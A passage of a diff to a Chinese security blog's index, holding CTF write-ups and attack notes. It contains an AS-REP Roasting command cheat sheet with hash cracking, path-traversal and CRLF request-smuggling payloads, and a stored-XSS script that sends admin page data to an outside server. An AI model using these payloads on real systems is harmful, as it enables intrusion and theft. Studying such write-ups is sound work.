@@ -85,55 +85,6 @@ new Image().src → 发 GET 请求，不关心 CORS 响应，最简外带
       </tags>
   </entry>
   <entry>
-    <title>攻击方式 - AS-REP Roasting</title>
-    <url>/2026/08/24/as-rep-roasting/</url>
-    <content><![CDATA[定义：AS-REPRoasting是一种针对启用”不要要求Kerberos预认证”选项的域用户的离线密码攻击
-攻击条件：
-Kerberos预身份认证关闭
-不需要域管理员权限，普通域用户甚至匿名即可枚举  
-已知目标账户的用户名 
-攻击者网络可达域控（KDC），能与 88 端口通信
-
-实战场景：在域环境里，拿到普通访问权限后，找”不需要预认证”的账号，请求票据并离线爆破密码。  
-AS-REP Roasting 攻击的目标是「用户账户」，不是「机器」  
-攻击过程：获取hash（获取AS-REP响应包中用户hash加密的Login Session Key）
-工具1：RubeusRubeus.exe asreproast /format:john /outfile:hash.txt //域内机器版（已加域，当前用户有权限）Rubeus.exe asreproast /domain:域名 /dc:域控IP /user:用户名 /password:密码 /format:john /outfile:hash.txt         //远程攻击
-
-将提取到的hash保存为hash.txt
-工具2：ASREPRoast.ps1脚本 (域内PowerShell)Import-Module .\ASREPRoast.ps1Invoke-ASREPRoast | select -ExpandProperty Hash | Out-File hash.txt
-
-Adfind+GetNPUsers.py—拿到的是非域内机器前提：有一个有效的域账户和密码
-用Adfind查询域内查询Kerberos预身份认证关闭的用户
-adfind -h 域控IP -u 域名\用户名 -up 密码 -f &quot;useraccountcontrol:1.2.840.113556.1.4.803:=4194304&quot; samaccountname
-
-上一步过滤出来的域账户写入user.txt文件（或者直接用用户名本爆破）
-查到这些用户名后，用 Impacket 的 GetNPUsers.py 直接拿 Hash  （在kali）
-python GetNPUsers.py 域名/ -usersfile users.txt -format hashcat -outputfile hash.txt
-
-或者单用户名
-python GetNPUsers.py 域名/用户名:密码 -request -format john -outputfile hash.txt
-
-爆破hash 默认导出都是hashcat格式，除非手动改 &#x2F; 加 /format:john
-john爆破：# 最常用：rockyou 字典爆破john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt# 查看已破解的结果john --show hash.txt
-
-hashcat爆破：hashcat -m 18200 hash.txt rockyou.txt
-
-
-
-
- AS-REP Roasting 的 hash，hashcat 用 -m 18200，Kerberoasting 的用 -m 13100，别搞混了  
-
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>AS-REP Roasting</tag>
-        <tag>Kerberos</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUU 2025.10 Writeup</title>
     <url>/2026/08/24/buu-2025-10/</url>
     <content><![CDATA[题目类型：图片马命令执行+.htaccess配置文件构造PHP后门随便上传图片马，都提示上传失败，猜测是过滤了一些字符，在前面的[MRCTF2020]你传你🐎呢中有提到一些方法，我们先试着上传一个.htaccess文件
@@ -899,6 +850,89 @@ PHP反序列化字符逃逸
       </tags>
   </entry>
   <entry>
+    <title>BUU 2025.12 Writeup</title>
+    <url>/2026/08/24/buu-2025-12/</url>
+    <content><![CDATA[[HCTF 2018] WarmUp考点：PHP代码审计，文件包含 wp: 根据源码，访问source.php
+&lt;?php      highlight_file(__FILE__);      class emmm    &#123;          public static function checkFile(&amp;$page)          &#123;   $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];              if (! isset($page) || !is_string($page)) &#123;                  echo &quot;you can&#x27;t see it&quot;;                  return false;              &#125;               if (in_array($page, $whitelist)) &#123;                  return true;              &#125;          $_page = mb_substr($page,0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) );              if (in_array($_page, $whitelist)) &#123;                  return true;              &#125;          $_page = urldecode($page);                        $_page = mb_substr( $_page,0,mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;));              if (in_array($_page, $whitelist)) &#123;                  return true;              &#125;              echo &quot;you can&#x27;t see it&quot;;              return false;          &#125;      &#125;       if (! empty($_REQUEST[&#x27;file&#x27;])          &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])          &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])      ) &#123;          include $_REQUEST[&#x27;file&#x27;];          exit;      &#125; else &#123;          echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;; []()     &#125;  ?&gt;
+
+hint.php
+flag not here, and flag in ffffllllaaaagggg
+
+代码审计：
+class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+定义类：emmm静态方法:checkFile    作用：检查要包含的文件是否在白名单中    白名单是一个关联数组$whitelist，其中包含了允许包含的文件的键值对。在代码中，允许包含的文件有”source”&#x3D;&gt;”source.php”和”hint”&#x3D;&gt;”hint.php”。
+if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;
+isset:检查是否存在$page参数is_string:检查传入的$page参数是否为字符串类型
+if (in_array($page, $whitelist)) &#123;               return true;           &#125;
+in_array：检查是否在$whitelist中找到传入的 $page
+$_page = mb_substr(               $page,               0,               mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)           );
+mb_substr：从起始位置开始截取到mb_strpos($page . ‘?’, ‘?’)mb_strpos:查找字符串$page . ‘?’中第一个问号 ? 的位置    先在 $page 末尾拼接一个问号 ?,再找?的位置总之就是：从字符串 $page 中提取问号 ? 之前的部分
+if (in_array($_page, $whitelist)) &#123;                  return true;              &#125;          $_page = urldecode($page);                        $_page = mb_substr( $_page,0,mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;));              if (in_array($_page, $whitelist)) &#123;                  return true;              &#125;  
+URL编码，之后再次检查传入的$page是否直接在白名单中存在
+if (! empty($_REQUEST[&#x27;file&#x27;])        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    &#125;  
+检查 $REQUEST[‘file’]是否为空，是否为字符串类型，并调用emmm::checkFile方法进行检查。如果返回值为true，则通过include语句包含 $REQUEST[‘file’]指定的文件并终止程序执行否则输出一个图片。
+payload：
+source.php?file=hint.php?/../../../../ffffllllaaaagggg
+source.php一般是在html目录下，往上是www，var，然后到根目录，flag一般就放在根目录下面，这里还有一个hint.php?&#x2F;或者source.php?&#x2F;，因此需要返回四层才能到根目录
+考点：XSS]]></content>
+      <categories>
+        <category>CTF wp</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>BUU</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻击方式 - AS-REP Roasting</title>
+    <url>/2026/08/24/as-rep-roasting/</url>
+    <content><![CDATA[定义：AS-REPRoasting是一种针对启用”不要要求Kerberos预认证”选项的域用户的离线密码攻击
+攻击条件：
+Kerberos预身份认证关闭
+不需要域管理员权限，普通域用户甚至匿名即可枚举  
+已知目标账户的用户名 
+攻击者网络可达域控（KDC），能与 88 端口通信
+
+实战场景：在域环境里，拿到普通访问权限后，找”不需要预认证”的账号，请求票据并离线爆破密码。  
+AS-REP Roasting 攻击的目标是「用户账户」，不是「机器」  
+攻击过程：获取hash（获取AS-REP响应包中用户hash加密的Login Session Key）
+工具1：RubeusRubeus.exe asreproast /format:john /outfile:hash.txt //域内机器版（已加域，当前用户有权限）Rubeus.exe asreproast /domain:域名 /dc:域控IP /user:用户名 /password:密码 /format:john /outfile:hash.txt         //远程攻击
+
+将提取到的hash保存为hash.txt
+工具2：ASREPRoast.ps1脚本 (域内PowerShell)Import-Module .\ASREPRoast.ps1Invoke-ASREPRoast | select -ExpandProperty Hash | Out-File hash.txt
+
+Adfind+GetNPUsers.py—拿到的是非域内机器前提：有一个有效的域账户和密码
+用Adfind查询域内查询Kerberos预身份认证关闭的用户
+adfind -h 域控IP -u 域名\用户名 -up 密码 -f &quot;useraccountcontrol:1.2.840.113556.1.4.803:=4194304&quot; samaccountname
+
+上一步过滤出来的域账户写入user.txt文件（或者直接用用户名本爆破）
+查到这些用户名后，用 Impacket 的 GetNPUsers.py 直接拿 Hash  （在kali）
+python GetNPUsers.py 域名/ -usersfile users.txt -format hashcat -outputfile hash.txt
+
+或者单用户名
+python GetNPUsers.py 域名/用户名:密码 -request -format john -outputfile hash.txt
+
+爆破hash 默认导出都是hashcat格式，除非手动改 &#x2F; 加 /format:john
+john爆破：# 最常用：rockyou 字典爆破john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt# 查看已破解的结果john --show hash.txt
+
+hashcat爆破：hashcat -m 18200 hash.txt rockyou.txt
+
+
+
+
+ AS-REP Roasting 的 hash，hashcat 用 -m 18200，Kerberoasting 的用 -m 13100，别搞混了  
+
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>AS-REP Roasting</tag>
+        <tag>Kerberos</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU 2025.11 Writeup</title>
     <url>/2026/08/24/buu-2025-11/</url>
     <content><![CDATA[题目类型：利用Nmap参数源码提示，flag在flag里
@@ -1156,40 +1190,6 @@ import requestsurl= &#x27;http://715a64dd-0d58-4d8f-85a7-dfeb9924ef59.node5.buuo
 结果：
 
 ]]></content>
-      <categories>
-        <category>CTF wp</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>BUU</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU 2025.12 Writeup</title>
-    <url>/2026/08/24/buu-2025-12/</url>
-    <content><![CDATA[[HCTF 2018] WarmUp考点：PHP代码审计，文件包含 wp: 根据源码，访问source.php
-&lt;?php      highlight_file(__FILE__);      class emmm    &#123;          public static function checkFile(&amp;$page)          &#123;   $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];              if (! isset($page) || !is_string($page)) &#123;                  echo &quot;you can&#x27;t see it&quot;;                  return false;              &#125;               if (in_array($page, $whitelist)) &#123;                  return true;              &#125;          $_page = mb_substr($page,0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) );              if (in_array($_page, $whitelist)) &#123;                  return true;              &#125;          $_page = urldecode($page);                        $_page = mb_substr( $_page,0,mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;));              if (in_array($_page, $whitelist)) &#123;                  return true;              &#125;              echo &quot;you can&#x27;t see it&quot;;              return false;          &#125;      &#125;       if (! empty($_REQUEST[&#x27;file&#x27;])          &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])          &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])      ) &#123;          include $_REQUEST[&#x27;file&#x27;];          exit;      &#125; else &#123;          echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;; []()     &#125;  ?&gt;
-
-hint.php
-flag not here, and flag in ffffllllaaaagggg
-
-代码审计：
-class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
-定义类：emmm静态方法:checkFile    作用：检查要包含的文件是否在白名单中    白名单是一个关联数组$whitelist，其中包含了允许包含的文件的键值对。在代码中，允许包含的文件有”source”&#x3D;&gt;”source.php”和”hint”&#x3D;&gt;”hint.php”。
-if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;
-isset:检查是否存在$page参数is_string:检查传入的$page参数是否为字符串类型
-if (in_array($page, $whitelist)) &#123;               return true;           &#125;
-in_array：检查是否在$whitelist中找到传入的 $page
-$_page = mb_substr(               $page,               0,               mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)           );
-mb_substr：从起始位置开始截取到mb_strpos($page . ‘?’, ‘?’)mb_strpos:查找字符串$page . ‘?’中第一个问号 ? 的位置    先在 $page 末尾拼接一个问号 ?,再找?的位置总之就是：从字符串 $page 中提取问号 ? 之前的部分
-if (in_array($_page, $whitelist)) &#123;                  return true;              &#125;          $_page = urldecode($page);                        $_page = mb_substr( $_page,0,mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;));              if (in_array($_page, $whitelist)) &#123;                  return true;              &#125;  
-URL编码，之后再次检查传入的$page是否直接在白名单中存在
-if (! empty($_REQUEST[&#x27;file&#x27;])        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    &#125;  
-检查 $REQUEST[‘file’]是否为空，是否为字符串类型，并调用emmm::checkFile方法进行检查。如果返回值为true，则通过include语句包含 $REQUEST[‘file’]指定的文件并终止程序执行否则输出一个图片。
-payload：
-source.php?file=hint.php?/../../../../ffffllllaaaagggg
-source.php一般是在html目录下，往上是www，var，然后到根目录，flag一般就放在根目录下面，这里还有一个hint.php?&#x2F;或者source.php?&#x2F;，因此需要返回四层才能到根目录
-考点：XSS]]></content>
       <categories>
         <category>CTF wp</category>
       </categories>
@@ -1565,6 +1565,42 @@ payload：
       <tags>
         <tag>CTF</tag>
         <tag>BUU</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>go to php - HTTP 请求走私</title>
+    <url>/2026/08/24/ctf-go-to-php-http-smuggling/</url>
+    <content><![CDATA[index.php看源码：
+
+
+RequestVenom 直接把用户控制的 path 拼接到固定的内部地址 http://localhost:8080，然后用 file_get_contents 发起请求
+lib.php
+
+
+接收CTF2026请求的内容，并url解码拼接进 HTTP header，pash中过滤了flag
+go.go
+
+
+&#x2F;write路径可以写入文件，需要name和path两个参数，但是如果参数不对就会显示bad note
+所以利用HTTP请求走私，同时向go发送两个请求，都带有相同的X-Trace编号，使解析为name&#x3D;AAA&amp;path&#x3D;z.txt是合法的，同时请求flag也带有授权 T1，被视为合法，即可返回 flag
+所以：
+外层请求:  /?path=/write?name=AAA%26path=z.txt                     + ctf2026 头走私 /flag                     ↓PHP 的 $path     = /write?name=AAA&amp;path=z.txt                     ↓PHP 发去 Go      = http://localhost:8080/write?name=AAA&amp;path=z.txt                     ↓Go 解析出两个请求:   ① GET /write?name=AAA&amp;path=z.txt  (X-Trace: T1)      → name=AAA 非空 ✓, path=z.txt 合法 ✓      → writeAndGrant → 授权 T1   ② GET /flag (X-Trace: T1)      → grants[T1] 命中 → 返回 flag
+
+payload:
+GET /?path=/write?name=AAA%26path=z.txtCTF2026: a%0d%0aHost:%20localhost:8080%0d%0aX-Trace:%20T1%0d%0a%0d%0aGET%20/flag%20HTTP/1.1%0d%0aHost:%20localhost:8080%0d%0aX-Trace:%20T1
+
+请求头** CRLF 注入**$header 来自我们请求的 HTTP_CTF2026 头，而 urldecode 能把 %0d%0a 变成真实的 **\r\n**，%0d%0a就是\r\n的url编码，所以payload解析就是：
+GET /write?name=AAA&amp;path=z.txt HTTP/1.1    ctf2026: a                                 Host: localhost:8080                      X-Trace: T1                                                                     GET /flag HTTP/1.1                         Host: localhost:8080                     X-Trace: T1                            Connection: keep-alive
+
+
+
+]]></content>
+      <categories>
+        <category>CTF wp</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>HTTP请求走私</tag>
       </tags>
   </entry>
   <entry>
@@ -2053,39 +2089,51 @@ SEAFARING xss
       </tags>
   </entry>
   <entry>
-    <title>go to php - HTTP 请求走私</title>
-    <url>/2026/08/24/ctf-go-to-php-http-smuggling/</url>
-    <content><![CDATA[index.php看源码：
+    <title>存储型 XSS 注入 + Admin Bot 提权 + XSS 外带</title>
+    <url>/2026/08/24/ctf-stored-xss-admin-bot/</url>
+    <content><![CDATA[拿到源码先看什么？1.app.py: 先把所有路由列出来，搞清楚网站有什么功能2.找漏洞： view_encoding.html  ：
+&lt;div class=&quot;subtitle&quot;&gt;&#123;&#123;encoding|safe&#125;&#125;&lt;/div&gt;
+
+|safe &#x3D; 不过滤直接输出。这是一个 sink。问题是：它输出的 encoding 里有什么我们可控？
+3.确认注入点：整体的逻辑：发送信息，经过base91编码，在&#x2F;s&#x2F;sid 路径下回显发送的内容，回显包括经过base91编码的内容和注册时设置的用户名
+&#x2F;s&#x2F; 路由里：
+signal = read_signal(sid, session.get(&quot;callsign&quot;))return render_template(&quot;view_encoding.html&quot;, encoding=signal)
+
+signal 是一个 dict：{“text”: base91密文, “creator”: 笔记owner}。
+Jinja2 渲染一个 dict 时会调用 str(dict)，输出它的 repr：{‘text’: ‘AbC…’, ‘creator’: ‘admin’}
+所以页面 HTML 实际长这样。而|safe保证尖括号原样渲染。
+注意：repr 自动转义引号和反斜杠creator 就是我们注册时的用户名，原样进 dict repr，原样进 HTML。
+所以注入点不在 text，在 username
+4.bot:  alienbot.js经验：CTF Web 题里，只要出现 bot、puppeteer、headless、chromium 这类关键词，99% 考 XSS。因为 bot 的作用就是模拟管理员访问页面，触发你的 XSS。  
+**外带 **&#x3D; 让 bot 的浏览器（在 admin 会话里）主动把读到的 flag 数据，当成一个”请求”发到你自己的服务器上。
+5.构造payload先定目标：XSS 在 admin 会话里要做什么
+拿 admin 的 dashboard → 里面有 flag 的 sid
+请求 &#x2F;s&#x2F; → 读到 flag（base91 密文）
+把内容发到我的服务器（外带）
+注册时username为:
+&lt;script&gt;fetch(&quot;/&quot;).then(r=&gt;r.text()).then(h=&gt;&#123;let s=h.split(&quot;/s/&quot;)[1].substring(0,40);fetch(&quot;/s/&quot;+s).then(r=&gt;r.text()).then(t=&gt;&#123;new Image().src=&quot;http://120.53.249.234:8080/?d=&quot;+encodeURIComponent(t);&#125;);&#125;);&lt;/script&gt;
+
+评论区的payload：（逆向思维-&gt;91编码）
+f0ef71053aa76696f8f6d7ea80d74bcf03fa874e059795971fc18afbf221fa6b0503f7fa1b7ee854705979f9110cb9a75607bc5e7abefd01fad888e87fdd0e23f32318497fe8408c323b7afedb61c66aafffca170a861f3a155c565e7e042beecb87e8af150cdceb6ff8a153c165e5e54770e4ae6b1c2a036a39c30dc158e09de6d19f1153bad58799ac3c2bac44d1861e5e81a856f77ebd301ca6e000
+
+解析：
+fetch(&quot;/&quot;)                                   // ① admin 身份拿 dashboard  .then(r =&gt; r.text())                       // ② 读 HTML 文本  .then(h =&gt; &#123;                               // ③ 从 HTML 里抠出 flag 的 sid    let s = h.split(&quot;/s/&quot;)[1].substring(0,40);    fetch(&quot;/s/&quot; + s).then(r =&gt; r.text())     // ④ 读 flag 页面      .then(t =&gt; &#123;        new Image().src = &quot;http://120.53.249.234:8080/?d=&quot; + encodeURIComponent(t);  // ⑤ 外带      &#125;);  &#125;); 
+
+服务器监听：python3 -m http.server 8080
 
 
-RequestVenom 直接把用户控制的 path 拼接到固定的内部地址 http://localhost:8080，然后用 file_get_contents 发起请求
-lib.php
+url解码
 
 
-接收CTF2026请求的内容，并url解码拼接进 HTTP header，pash中过滤了flag
-go.go
-
-
-&#x2F;write路径可以写入文件，需要name和path两个参数，但是如果参数不对就会显示bad note
-所以利用HTTP请求走私，同时向go发送两个请求，都带有相同的X-Trace编号，使解析为name&#x3D;AAA&amp;path&#x3D;z.txt是合法的，同时请求flag也带有授权 T1，被视为合法，即可返回 flag
-所以：
-外层请求:  /?path=/write?name=AAA%26path=z.txt                     + ctf2026 头走私 /flag                     ↓PHP 的 $path     = /write?name=AAA&amp;path=z.txt                     ↓PHP 发去 Go      = http://localhost:8080/write?name=AAA&amp;path=z.txt                     ↓Go 解析出两个请求:   ① GET /write?name=AAA&amp;path=z.txt  (X-Trace: T1)      → name=AAA 非空 ✓, path=z.txt 合法 ✓      → writeAndGrant → 授权 T1   ② GET /flag (X-Trace: T1)      → grants[T1] 命中 → 返回 flag
-
-payload:
-GET /?path=/write?name=AAA%26path=z.txtCTF2026: a%0d%0aHost:%20localhost:8080%0d%0aX-Trace:%20T1%0d%0a%0d%0aGET%20/flag%20HTTP/1.1%0d%0aHost:%20localhost:8080%0d%0aX-Trace:%20T1
-
-请求头** CRLF 注入**$header 来自我们请求的 HTTP_CTF2026 头，而 urldecode 能把 %0d%0a 变成真实的 **\r\n**，%0d%0a就是\r\n的url编码，所以payload解析就是：
-GET /write?name=AAA&amp;path=z.txt HTTP/1.1    ctf2026: a                                 Host: localhost:8080                      X-Trace: T1                                                                     GET /flag HTTP/1.1                         Host: localhost:8080                     X-Trace: T1                            Connection: keep-alive
-
-
-
+带出整个页面，得到flag
 ]]></content>
       <categories>
         <category>CTF wp</category>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>HTTP请求走私</tag>
+        <tag>XSS</tag>
+        <tag>Admin Bot</tag>
       </tags>
   </entry>
   <entry>
@@ -2221,51 +2269,63 @@ cd /d C:\Users\HP\Desktopcurl -X POST &quot;http://127.0.0.1:8000/api/upload&quo
       </tags>
   </entry>
   <entry>
-    <title>存储型 XSS 注入 + Admin Bot 提权 + XSS 外带</title>
-    <url>/2026/08/24/ctf-stored-xss-admin-bot/</url>
-    <content><![CDATA[拿到源码先看什么？1.app.py: 先把所有路由列出来，搞清楚网站有什么功能2.找漏洞： view_encoding.html  ：
-&lt;div class=&quot;subtitle&quot;&gt;&#123;&#123;encoding|safe&#125;&#125;&lt;/div&gt;
+    <title>DNS 重定向</title>
+    <url>/2026/08/24/dns-rebinding/</url>
+    <content><![CDATA[文章：https://zhuanlan.zhihu.com/p/89426041
+工具：https://lock.cmpxchg8b.com/rebinder.html
+DNS原理：https://www.ruanyifeng.com/blog/2016/06/dns.html1.DNSDNS是Domain Name Service的缩写,计算机域名服务器,在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，而域名解析需要由专门的域名解析服务器来完成，这就是DNS域名服务器。就是根据域名查出IP地址。你可以把它想象成一本巨大的电话本。举例来说，如果你要访问域名math.stackexchange.com，首先要通过DNS查出它的IP地址是151.101.129.69。
+2.DNS TTLTTL值全称是“生存时间（Time To Live)”，简单的说它表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。
+当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。
+常见的设置TTL值的场景1.增大TTL值，以节约域名解析时间通常情况下域名解析记录是很少更改的。我们可以通过增大域名记录的TTL值让记录在各地DNS服务器中缓存的时间加长，这样在更长的时间段内，我们访问这个网站时，本地ISP的DNS服务器就不需要向域名的NS服务器发出解析请求，而直接从本地缓存中返回域名解析记录,从而提高解析效率。 TTL值是以秒为单位的，通常的默认值都是3600，也就是默认缓存1小时。我们可以根据实际需要把TTL值扩大，例如要缓存一天就设置成86400。
+2.减小TTL值，减少更新域名记录时的不可访问时间更换空间因为TTL缓存的问题，新的域名记录，在有的地方可能生效了，有的地方可能等上一两天甚至更久才生效。结果就是有的人访问到了新服务器，有的人访问到了旧服务器。如果原来的域名TTL值设置的小，各地的ISP域名缓存服务器服务器就会很快的访问你域名的权威DNS解析服务器，尽快把你域名的DNS解析IP返回给查询者。
+3.DNS Rebinding在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。
+具体步骤
+攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network
+攻击者通过一些方式诱导受害者加载http://rebind.network
+用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址
+恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效
+从http://rebind.network加载的网页包含恶意的js代码,构造恶意的请求到http://rebind.network/index,而受害者的浏览器便在执行恶意请求
+一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让http://rebind.network绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果
 
-|safe &#x3D; 不过滤直接输出。这是一个 sink。问题是：它输出的 encoding 里有什么我们可控？
-3.确认注入点：整体的逻辑：发送信息，经过base91编码，在&#x2F;s&#x2F;sid 路径下回显发送的内容，回显包括经过base91编码的内容和注册时设置的用户名
-&#x2F;s&#x2F; 路由里：
-signal = read_signal(sid, session.get(&quot;callsign&quot;))return render_template(&quot;view_encoding.html&quot;, encoding=signal)
+同源策略的失效对于WEB的同源策略相信大家都很熟悉,如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源,而不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。
+当然,页面中的链接，重定向以及表单提交是不会受到同源策略限制的,并且,跨域资源的引入是可以的。但是js不能读写加载的内容。
+同源策略确实提高了web的安全性,但是对于DNS Rebinding来说是没有作用的,因为同源策略看的是域名,并不是背后的IP地址,虽然两次的请求IP地址不同,但是由于DNS服务器的绑定,域名都是一样的,那么自然不违反同源策略.
+CTF实战应用balsnCTF2019 韩国鱼本题的一个步骤也涉及到了DNS重绑定的利用,这里就截取部分代码说明,完整的wp可以查看https://mp.weixin.qq.com/s/ToORsrR_1fh1gnnO2cM_VQ
+部分涉及到的代码
+$dst = @$_GET[&#x27;KR&#x27;];$res = @parse_url($dst);$ip = @dns_get_record($res[&#x27;host&#x27;], DNS_A)[0][&#x27;ip&#x27;];...$dev_ip = &quot;54.87.54.87&quot;;if($ip === $dev_ip) &#123;    $content = file_get_contents($dst);    echo $content;&#125;
 
-signal 是一个 dict：{“text”: base91密文, “creator”: 笔记owner}。
-Jinja2 渲染一个 dict 时会调用 str(dict)，输出它的 repr：{‘text’: ‘AbC…’, ‘creator’: ‘admin’}
-所以页面 HTML 实际长这样。而|safe保证尖括号原样渲染。
-注意：repr 自动转义引号和反斜杠creator 就是我们注册时的用户名，原样进 dict repr，原样进 HTML。
-所以注入点不在 text，在 username
-4.bot:  alienbot.js经验：CTF Web 题里，只要出现 bot、puppeteer、headless、chromium 这类关键词，99% 考 XSS。因为 bot 的作用就是模拟管理员访问页面，触发你的 XSS。  
-**外带 **&#x3D; 让 bot 的浏览器（在 admin 会话里）主动把读到的 flag 数据，当成一个”请求”发到你自己的服务器上。
-5.构造payload先定目标：XSS 在 admin 会话里要做什么
-拿 admin 的 dashboard → 里面有 flag 的 sid
-请求 &#x2F;s&#x2F; → 读到 flag（base91 密文）
-把内容发到我的服务器（外带）
-注册时username为:
-&lt;script&gt;fetch(&quot;/&quot;).then(r=&gt;r.text()).then(h=&gt;&#123;let s=h.split(&quot;/s/&quot;)[1].substring(0,40);fetch(&quot;/s/&quot;+s).then(r=&gt;r.text()).then(t=&gt;&#123;new Image().src=&quot;http://120.53.249.234:8080/?d=&quot;+encodeURIComponent(t);&#125;);&#125;);&lt;/script&gt;
+很明显,题目是想定死我们域名的ip为54.87.54.87,但是这样就没法读到内网的信息了,如果我们域名解析的IP直接为127.0.0.1,那就无法过$ip === $dev_ip,接下来就得利用DNS Rebinding
+这是一个测试dns重绑定漏洞的网站,可以让一个域名随机的绑定两个IP https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg
+让我们在本地测试一下吧
+➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 127.0.0.1➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 127.0.0.1➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 54.87.54.87➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 54.87.54.87➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 54.87.54.87➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 54.87.54.87➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 127.0.0.1➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 127.0.0.1
 
-评论区的payload：（逆向思维-&gt;91编码）
-f0ef71053aa76696f8f6d7ea80d74bcf03fa874e059795971fc18afbf221fa6b0503f7fa1b7ee854705979f9110cb9a75607bc5e7abefd01fad888e87fdd0e23f32318497fe8408c323b7afedb61c66aafffca170a861f3a155c565e7e042beecb87e8af150cdceb6ff8a153c165e5e54770e4ae6b1c2a036a39c30dc158e09de6d19f1153bad58799ac3c2bac44d1861e5e81a856f77ebd301ca6e000
+所以思路很明确,先让$ip为54.87.54.87,然后在file_get_contents的时候我们GET的域名又绑定到127.0.0.1,这样就绕过了if判断语句,可以读内网信息,当然,由于是随机的,所以要多打几次.
+[SECCON 2019 Web: Option-Cmd-U]题目地址:http://ocu.chal.seccon.jp:10000
